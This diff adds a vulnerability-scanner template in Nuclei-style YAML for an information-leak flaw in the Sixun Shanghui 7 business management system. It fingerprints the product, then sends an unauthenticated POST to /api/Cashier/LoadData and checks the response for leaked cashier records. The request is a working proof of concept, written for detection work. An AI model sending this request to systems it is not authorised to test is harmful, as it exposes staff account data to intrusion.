@@ -1,0 +1,39 @@
+id: poc-yaml-sixun-shanghui7-bms-loaddata-info-leak
+info:
+  name: 思迅商慧7商业管理系统 LoadData 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "思迅商慧7商业管理系统"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Cashier/LoadData"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Accept: "*/*"
+    body: "loadAll=false&cashier_id=&gridFlag=CashierList&page=1&rows=60"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"cashier_status\":\"正常\""
+          - "\"cashier_status\":\"登录\""
+          - "\"success\":true"
